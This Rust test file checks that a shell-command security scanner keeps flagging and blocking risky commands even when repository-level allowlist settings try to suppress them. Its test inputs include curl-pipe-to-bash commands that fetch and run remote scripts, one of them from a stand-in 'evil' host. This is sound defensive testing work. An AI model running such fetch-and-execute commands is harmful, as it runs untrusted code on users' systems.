//! Adversarial bypass regression tests for the allowlist and blocklist paths.
//! Each test attempts to circumvent a security fix; a flip signals a
//! reintroduced bypass.
//!
//! F9 update: a policy discovered by walking up to a `.git` boundary is
//! REPO-scoped and attacker-controllable, so its suppression fields (`allowlist`,
//! `allowlist_rules`, `severity_overrides`, …) are NEUTRALIZED — a repo may
//! tighten but never suppress. The repo-scope tests here therefore assert the
//! finding STILL FIRES under a repo allowlist; the legitimate org/user-scope
//! suppression feature is covered in `policy_integration.rs`.

use std::fs;

use tempfile::TempDir;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId};

fn make_repo(policy_yaml: &str) -> TempDir {
    let tmp = TempDir::new().expect("create temp dir");
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), policy_yaml).unwrap();
    tmp
}

fn analyze_exec(input: &str, cwd: &str) -> tirith_core::verdict::Verdict {
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(cwd.to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
    };
    engine::analyze(&ctx)
}

#[test]
fn test_bypass_allowlist_rules_wrong_rule_id_does_not_suppress() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: nonexistent_rule
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Wrong rule_id must NOT suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_allowlist_rules_correct_id_wrong_pattern_does_not_suppress() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - definitely-not-bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Non-matching pattern must NOT suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_allowlist_rules_repo_scoped_does_not_suppress_named_rule() {
    // F9: a repo-scoped `allowlist_rules` is NEUTRALIZED (a repo checkout is
    // attacker-controllable, so it may tighten but never suppress). Even the
    // named rule (ShortenedUrl) must keep firing here. The legitimate
    // org/user-scope suppression feature is covered in policy_integration.rs
    // (`test_f9_org_scope_policy_is_honored` / `test_f9_user_scope_allowlist_is_honored`).
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "F9: repo-scoped allowlist_rules must NOT suppress ShortenedUrl"
    );
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "CurlPipeShell must remain — repo allowlist cannot suppress it either"
    );
}

#[test]
fn test_bypass_allowlist_rules_repo_scoped_uppercase_rule_id_does_not_suppress() {
    // F9: an uppercase `rule_id` cannot smuggle suppression past the repo-scope
    // neutralization either — a repo `allowlist_rules` is cleared regardless of
    // the casing it uses. (The case-insensitive MATCHER itself is exercised at
    // org scope by `test_f9_org_scope_allowlist_rules_case_insensitive_rule_id`
    // in policy_integration.rs.)
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: SHORTENED_URL
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "F9: repo-scoped allowlist_rules (uppercase id) must NOT suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_allowlist_rules_repo_scoped_mixed_case_rule_id_does_not_suppress() {
    // F9: same as above for a mixed-case `rule_id`.
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: Shortened_Url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "F9: repo-scoped allowlist_rules (mixed-case id) must NOT suppress ShortenedUrl"
    );
}

#[test]
fn test_bypass_blocklist_overrides_allowlist_rules() {
    let policy = r#"
fail_mode: open
blocklist:
  - bit.ly
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist must override allowlist_rules — PolicyBlocklisted should fire"
    );
}

#[test]
fn test_bypass_allowlist_rules_pipe_to_shell_repo_scoped_does_not_suppress() {
    // F9: a repo-scoped `allowlist_rules` cannot suppress CurlPipeShell — a
    // hostile repo declaring its own install URL "trusted" is exactly the bypass
    // F9 closes. The finding must still fire and BLOCK. The legitimate
    // org-scope version of this exact recipe is honored in
    // `test_f9_org_scope_policy_is_honored` (policy_integration.rs).
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - example.com/install.sh
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "F9: repo-scoped allowlist_rules must NOT suppress CurlPipeShell"
    );
    assert_eq!(
        verdict.action,
        Action::Block,
        "CurlPipeShell still fires under a repo allowlist → Block"
    );
}

#[test]
fn test_bypass_allowlist_rules_pipe_to_shell_untrusted_url_not_suppressed() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - trusted.example.com/install.sh
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.example.com/payload.sh | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "Non-matching URL must NOT suppress CurlPipeShell"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_bypass_allowlist_rules_empty_patterns_does_nothing() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns: []
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Empty patterns array must not suppress anything"
    );
}

#[test]
fn test_bypass_allowlist_rules_empty_pattern_string_does_nothing() {
    let policy = "fail_mode: open\nallowlist_rules:\n  - rule_id: shortened_url\n    patterns:\n      - \"\"\n";
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "Empty string pattern must not suppress anything"
    );
}

#[test]
fn test_bypass_global_allowlist_repo_scoped_does_not_suppress() {
    // F9: a repo-scoped global `allowlist` is neutralized (a hostile repo must
    // not be able to drop a finding for an attacker-chosen URL). ShortenedUrl
    // must still fire. The legit global-allowlist suppression at user scope is
    // covered by `test_f9_user_scope_allowlist_is_honored` in policy_integration.rs.
    let policy = r#"
fail_mode: open
allowlist:
  - bit.ly
"#;
    let repo = make_repo(policy);
    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "F9: repo-scoped global allowlist must NOT suppress ShortenedUrl"
    );
}
